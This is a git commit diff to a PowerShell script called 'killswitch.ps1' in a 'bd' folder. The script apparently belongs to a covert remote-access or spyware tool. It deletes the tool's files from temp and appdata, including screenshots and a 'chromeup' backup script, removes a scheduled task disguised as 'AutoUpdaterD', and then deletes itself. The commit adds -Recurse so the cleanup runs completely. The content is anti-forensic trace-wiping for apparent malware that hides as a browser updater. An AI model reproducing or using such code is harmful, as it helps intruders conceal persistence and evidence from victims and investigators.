1f3cc49d5f6c91eb9b66c2839e8fbbad6ccc8fbb
blousekool <132397759+blousekool@users.noreply.github.com>
2023-10-12 10:15:44 +0200

    Update killswitch.ps1

--- bd/killswitch.ps1
+++ bd/killswitch.ps1
@@ -6,11 +6,11 @@ Remove-Item $env:temp\sVBXKuz\libsodium.dll -Force
 Remove-Item $env:temp\sVBXKuz\libopus.dll -Force
 Remove-Item $env:temp\sVBXKuz\screenshot.png -Force
 cd..
-Remove-Item $env:temp\sVBXKuz -Force
+Remove-Item $env:temp\sVBXKuz -Recurse -Force
 Remove-Item $env:temp\username.json
 
 Remove-Item $env:appdata\chromeup\backup.ps1 -Force
-Remove-Item $env:appdata\chromeup -Force
+Remove-Item $env:appdata\chromeup -Recurse -Force
 
 Unregister-ScheduledTask -TaskName "AutoUpdaterD" -Confirm:$false
 powershell.exe /c Remove-Item $env:temp/killswitch.ps1;Remove-Item $env:temp\sVBXKuz -Force
